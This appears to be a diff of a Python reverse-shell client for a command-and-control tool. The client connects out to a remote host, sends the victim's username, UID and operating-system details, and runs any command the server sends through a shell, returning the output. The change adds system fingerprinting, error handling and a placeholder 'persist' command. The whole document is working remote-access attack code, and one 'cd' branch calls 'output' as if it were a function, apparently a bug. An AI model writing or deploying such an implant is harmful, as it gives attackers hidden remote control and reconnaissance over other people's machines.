@@ -4,57 +4,65 @@ import subprocess
 import os
 import sys
 import pwd
+import platform
+import time
 
 
 def session_handler():
-    print(f'[+] Connecting to {host_ip}')
-    sock.connect((host_ip, int(host_port)))
+    try:
+        print(f'[+] Connecting to {host_ip}')
+        sock.connect((host_ip, int(host_port)))
 
-    # using the pwd library allows access to
-    # the password database in a Linux
-    # system. This means we can grab
-    # usernames based on the UID of the
-    # current user account
-    username = pwd.getpwuid(os.getuid())[0]
-    user_uid = os.getuid()
-    print(username)
-    print(user_uid)
+        # using the pwd library allows access to
+        # the password database in a Linux
+        # system. This means we can grab
+        # usernames based on the UID of the
+        # current user account
+        outbound(pwd.getpwuid(os.getuid())[0])
+        outbound(os.getuid())
 
-    outbound(username)
-    outbound(user_uid)
+        # prevent traffic getting messy
+        time.sleep(1)
 
-    print(f'[+] Connected to {host_ip}')
+        op_sys = platform.uname()
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        outbound(op_sys)
 
-    while True:
-        message = inbound()
-        print(f'[+] Message received - {message}')
+        print(f'[+] Connected to {host_ip}')
 
-        if message == 'exit':
-            print('[-] The server has terminated the session')
-            sock.close()
-            break
-        elif message.split(" ")[0] == 'cd':
-            try:
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                cur_dir = os.getcwd()
-                print(f'[+] Changed current directory to {cur_dir}')
-                output(cur_dir)
-            except FileNotFoundError:
-                outbound('Invalid directory. Please try again.')
-        elif message == 'background':
-            # This command backs out of a current session so the server can interact with another
-            pass
-        else:
-            # subprocess command handling
-            command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-            output = command.stdout.read() + command.stderr.read()
-            outbound(output.decode())
+        while True:
+            message = inbound()
+            print(f'[+] Message received - {message}')
+
+            if message == 'exit':
+                print('[-] The server has terminated the session')
+                sock.close()
+                break
+            elif message == 'persist':
+                pass
+            elif message.split(" ")[0] == 'cd':
+                try:
+                    directory = str(message.split(" ")[1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    print(f'[+] Changed current directory to {cur_dir}')
+                    output(cur_dir)
+                except FileNotFoundError:
+                    outbound('Invalid directory. Please try again.')
+            elif message == 'background':
+                # This command backs out of a current session so the server can interact with another
+                pass
+            else:
+                # subprocess command handling
+                command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                outbound(output.decode())
+    except ConnectionRefusedError:
+        pass
 
 def inbound():
-    """
-    This function captures incoming traffic and redirects it
-    back to session_handler
+    """ This function captures incoming traffic and redirects it
+        back to session_handler
     """
     print('[+] Awaiting response...')
     message = ''
